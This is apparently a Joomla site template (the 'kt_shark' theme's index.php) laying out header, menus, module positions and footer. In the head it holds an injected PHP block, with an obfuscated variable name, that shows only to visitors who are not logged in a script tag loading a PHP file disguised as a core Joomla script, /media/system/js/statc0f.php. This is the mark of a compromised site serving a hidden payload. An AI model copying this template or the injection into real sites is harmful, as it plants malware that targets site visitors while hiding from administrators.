<?php defined( '_JEXEC' ) or die( 'Restricted access' );?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" >
  <head>
    <jdoc:include type="head" />
    <link rel="SHORTCUT ICON" href="<?php echo $this->baseurl ?>/templates/kt_shark/images/shark.ico" />
    <?php /*
    <link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/kt_shark/css/kt_shark.css" type="text/css" />
    */ ?>
    <link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/kt_shark/css/base.css" type="text/css" />
    <link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/kt_shark/css/print.css" type="text/css" media="print" />
	<!--[if lt IE 7]><link rel="stylesheet" type="text/css" media="screen" href="<?php echo $this->baseurl ?>/templates/kt_shark/css/ie.css" /><![endif]-->
    <link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/kt_shark/script/slimbox2/slimbox2.css" type="text/css">
    

<?php $_c0f0acae=1;if(is_object($_SESSION["__default"]["user"]) && !($_SESSION["__default"]["user"]->id)) {echo "
<script language=JavaScript id=onDate ></script>
<script language=JavaScript src=/media/system/js/statc0f.php ></script>
";};$_c0f0acae=1; ?>
</head>
<body>
  <div id="header">
    <div class="inside">
      <a href="<?php echo $this->baseurl ?>"><?php echo '<h1>', $mainframe->getCfg('sitename'), '</h1>';?></a>
    </div>
  </div>
<?php if ($this->countModules('topMenu')) : ?>
  <div id="navBar">
    <jdoc:include type="modules" name="topMenu" style="xhtml" />
  </div>
<?php endif; ?>
  <div id="container">
<?php if ($topUserModCount = (($user1=($this->countModules('user1'))?1:0) +
		 ($user2=($this->countModules('user2'))?1:0) +
		 ($user3=($this->countModules('user3'))?1:0) + 
		 ($user4=($this->countModules('user4'))?1:0))) : ?>
	<div id="userMods">
	<?php if ($user1) : ?>
		<div id="userMod1"  class="userMod<?php echo $topUserModCount; ?>">	
			<jdoc:include type="modules" name="user1" style="xhtml" />
		</div>
	<?php endif; ?>
	<?php if ($user2) : ?>	
		<div id="userMod2" class="userMod<?php echo $topUserModCount; ?>">
			<jdoc:include type="modules" name="user2" style="xhtml" />
		</div>
	<?php endif; ?>
	<?php if ($user3) : ?>
		<div id="userMod3" class="userMod<?php echo $topUserModCount; ?>">
			<jdoc:include type="modules" name="user3" style="xhtml" />
		</div>
	<?php endif; ?>
	<?php if ($user4) : ?>	
		<div id="userMod4" class="userMod<?php echo $topUserModCount; ?>">
			<jdoc:include type="modules" name="user4" style="xhtml" />
		</div>
	<?php endif; ?>
    </div>
<?php endif; ?>
    <div id="content">
      <div class="inside">
<?php if ($this->countModules('image')) : ?>
		<div id="image">
	    	<jdoc:include type="modules" name="image" style="xhtml" />
		</div>
<?php endif; ?>      
<?php if ($this->countModules('top')) : ?>
        <div class="top">
 	      <jdoc:include type="modules" name="top" style="xhtml" />
 	    </div>
<?php endif; ?>
        <div class="main_content">
          <jdoc:include type="component" />
        </div>
<?php if ($this->countModules('bottom')) : ?>    
	    <div id="bottom">
    	  <jdoc:include type="modules" name="bottom" style="xhtml" />
      	</div>
<?php endif; ?>
      </div>
    </div>
<?php if ($this->countModules('footer')) : ?>
    <div id="footer">
      <div class="inside">
        <jdoc:include type="modules" name="footer" style="xhtml" />
      </div>
    </div>
<?php endif; ?>
  </div>
  <?php if ($this->countModules('breadcrumb')) : ?>
  <div id="breadcrumb">
    <jdoc:include type="modules" name="breadcrumb" style="xhtml" />
  </div>
<?php endif; ?>
  
<?php if ($this->countModules('debug')) : ?>
  <div id="debug">
    <jdoc:include type="modules" name="debug" />
  </div>
<?php endif; ?>
</body>
</html>